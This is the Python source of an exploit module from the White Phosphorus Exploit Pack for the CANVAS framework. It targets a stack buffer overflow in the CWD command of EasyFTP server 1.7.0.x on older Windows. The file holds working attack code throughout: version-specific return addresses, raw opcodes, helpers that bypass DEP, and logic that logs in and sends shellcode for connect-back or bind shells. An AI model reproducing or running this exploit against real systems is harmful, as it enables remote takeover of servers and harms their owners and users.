
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer

######################################################################################
NAME = "EasyFtp Version 1.7.0.x FTP Remote Exploit"
DESCRIPTION = "Exploits a stack based overflow in the CWD field of the EasyFTP FTP service listening on port 21"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "2010-02-22"
DOCUMENTATION["References"] = """
http://code.google.com/p/easyftpsvr/
http://www.exploit-db.com/exploits/11539"""
DOCUMENTATION["Notes"] = """
Exploit stages shellcode through existing socket. If there are other FTP connections active, this may fail."""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP","2000"]

NOTES="""
Return address is overwritten"""

PORT = 21
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Autoversioning", (0x00000000), []],
    1 : ["Windows 2003 SP1-SP2 DEP", (0x00000000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows XP SP2-SP3 DEP", (0x00000000), [WINXPSP2, WINXPSP3]],
    3 : ["Windows Other", (0x00000000), [WINALL]]
}

appversions = {
        # VAPtr,  RecvPtr  ESP+204,ret4   Push ESP/xor/RET  ESP+104
    1 : (0x4231F8,0x42323C,0x0040944B,    0x004010A4, 0x0040324A), #easyftpsvr-1.7.0.2 / easyftpsvr-1.7.0.3
    2 : (0x4231F8,0x42323C,0x0040952B,    0x004010A4, 0x0040323A), #easyftpsvr-1.7.0.4
    3 : (0x423148,0x423244,0x0040942B,    0x004010A4, 0x0040323A), #easyftpsvr-1.7.0.5 / easyftpsvr-1.7.0.6 / easyftpsvr-1.7.0.7
    4 : (0x424148,0x424244,0x0040971B,    0x004010A4, 0x00403343), #easyftpsvr-1.7.0.8
    5 : (0x424148,0x424244,0x004096DB,    0x004010A4, 0x00403343), #easyftpsvr-1.7.0.9
    6 : (0x425148,0x42524C,0x004096AB,    0x004010A4, 0x00403313), #easyftpsvr-1.7.0.10 
    7 : (0x425148,0x42524C,0x0040974B,    0x004010A4, 0x00403313)  #easyftpsvr-1.7.0.11
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
            "IE Inject Connect Back",
            "HTTPMOSDEF SSL",
            "HTTPMOSDEF PLAIN",
            "Bind MOSDEF Shell",
            "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20\x25\x26\x2b\x2f\x5c"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False

        self.user = "anonymous"
        self.password = "anonymous"
        
        self.appversion=1
        
        return

    def usage(self):
        appvertext = "\n\n"
        appvertext += "App Version Selection:\n"
        appvertext += "-O ver:1 (1.7.0.2/1.7.0.3)\n"
        appvertext += "   ver:2 (1.7.0.4)\n"
        appvertext += "   ver:3 (1.7.0.5/1.7.0.6/1.7.0.7)\n"
        appvertext += "   ver:4 (1.7.0.8)\n"
        appvertext += "   ver:5 (1.7.0.9)\n"
        appvertext += "   ver:6 (1.7.0.10)\n"
        appvertext += "   ver:7 (1.7.0.11)"
        
        self.wp_usage(targets,"-U <user>\t -P <password>"+appvertext)
        
        return  
    
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return    
        
    def test(self):
        # Simple test
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        self.log('WP> Checking ftp banner')
        ret = wp_bannerchecktest(self,self.host,self.port,{"BigFoolCat Ftp Server": 1})
              
        return ret

    def neededListenerTypes(self):
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)  
        
        appver = self.argsDict.get("appVersion",'1.7.0.2 / 1.7.0.3')
        if appver == '1.7.0.2 / 1.7.0.3':
            self.appversion =1
        elif appver == '1.7.0.4':
            self.appversion =2
        elif appver == '1.7.0.5 / 1.7.0.6 / 1.7.0.7':
            self.appversion =3
        elif appver == '1.7.0.8':
            self.appversion =4
        elif appver == '1.7.0.9':
            self.appversion =5
        elif appver == '1.7.0.10':
            self.appversion =6
        elif appver == '1.7.0.11':
            self.appversion =7            
        
        # cmd line option
        if self.argsDict.get("ver",'') != '':
            self.appversion =int(self.argsDict.get("ver",''))
                
        print self.appversion
        
        # Autoversioning OS/target detection
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)

        return

    def makesploit(self):
        payload = ""
        
        payload += "A" * 40
        
        if self.version == 3:  #Windows XP/Other Non DEP
            # fix esp
            payload += wp_FixESPEBPP(1000)
            
            # code to use apps function for VirtualAlloc
            payload += wp_AppVirtualAlloc(self,appversions[self.appversion][0])
            
            # Locate the correct socket
            payload += "\x8B\x74\x24\xA4\x8B\x76\x04"
            # code to use apps funcion for recv and jump to payload
            payload += wp_AppRecv(self,appversions[self.appversion][1])
            
            payload += "\x90" * (266 - len(payload))
            # Short jmp
            payload += "\xeb\x04"
            payload += pack('<L',appversions[self.appversion][2])   #ftpbasicsvr.exe ADD ESP,204, RET 4
            payload += "X" * 24
            payload += pack('<L',appversions[self.appversion][3])   #ftpbasicsvr.exe Push ESP, xor dl,[eax], RET
            payload += "X" * 4
            # jmp back
            payload += "\xe9\xf3\xfe\xff\xff"
        else:
            if self.version == 1: #2k3 SP1/2
                payload += self.wp_UniversalDEPBypassWin2k3_VP(0x40) 
                
            elif self.version == 2: #XP SP2/3
                payload += self.wp_UniversalDEPBypassWinXP_VP(0x40)   
                
            # code to use apps function for VirtualAlloc
            payload += wp_AppVirtualAlloc(self,appversions[self.appversion][0])
            
            payload += "\x90" * (266 - len(payload))
            # Short jmp
            payload += "\xeb\x04"
            payload += pack('<L',appversions[self.appversion][4])   #ftpbasicsvr.exe ADD ESP,104, RET
            
            # Locate the correct socket
            if self.version == 1: # Win2k3 [esp-0x104]
                payload += "\x8B\xB4\x24\xFC\xFE\xFF\xFF\x8B\x76\x04"
            if self.version == 2: # WinXP [esp-0c]
                payload += "\x8B\xB4\x24\x3C\xFF\xFF\xFF\x8B\x76\x04"
              
            # code to use apps funcion for recv and jump to payload
            payload += wp_AppRecv(self,appversions[self.appversion][1])
            
        # add the command
        payload += "\r\n" 
        payload ="CWD " + payload
        
        return payload        


    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        payload = self.makesploit()
        
        self.result_error=0
        try:
            s = wp_ftplogin(self)  
            if s:            
                self.log("WP> Sending Exploit Trigger")
                s.sendall(payload)
            
                time.sleep(1)
                self.log("WP> Sending Exploit Payload")
                s.sendall(self.shellcode)
            
                time.sleep(2) # wait for it to be recvd

                if getattr(self, 'shell_REUSESOCKET',False) == False:
                    s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0        

        time.sleep(2)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret


if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
